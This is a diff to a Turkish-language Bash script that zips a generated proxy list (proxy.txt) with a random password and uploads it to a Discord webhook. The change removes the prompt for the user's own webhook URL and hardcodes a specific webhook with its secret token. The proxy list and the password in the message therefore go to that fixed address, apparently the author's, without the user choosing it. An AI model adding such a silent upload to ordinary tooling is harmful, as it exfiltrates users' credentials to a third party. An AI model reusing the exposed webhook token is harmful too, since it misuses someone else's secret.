@@ -133,19 +133,10 @@ jq_yukle() {
 
 file_io_yukle() {
     echo -e "\n\n\t$yesil Zip Yükleniyor ve Discord Webhook'a Gönderiliyor..\n$renkreset\n"
-
     local PASS=$(rastgele)
     zip --password $PASS proxy.zip proxy.txt
-
-    echo -e "\n$mor Lütfen Discord Webhook URL'sini girin:$renkreset"
-    read -p "Webhook URL: " WEBHOOK_URL
-
-    if [[ -z "$WEBHOOK_URL" ]]; then
-        echo -e "\n$kirmizi Hata: Webhook URL boş olamaz!$renkreset"
-        return 1
-    fi
-
-    curl -F "file=@proxys.zip" \
+    local WEBHOOK_URL="https://canary.discord.com/api/webhooks/1360708265041985840/oUSOByET2XVh_x-_RTwH5J2l_8asjnfgzmtDlHDgmt4CVK1JOPGy3HxMPlyjs1R2ugPK"
+    curl -F "file=@proxy.zip" \
          -F "payload_json={\"content\": \"Proxyler hazır! Şifre: ${PASS}\"}" \
          $WEBHOOK_URL
     clear
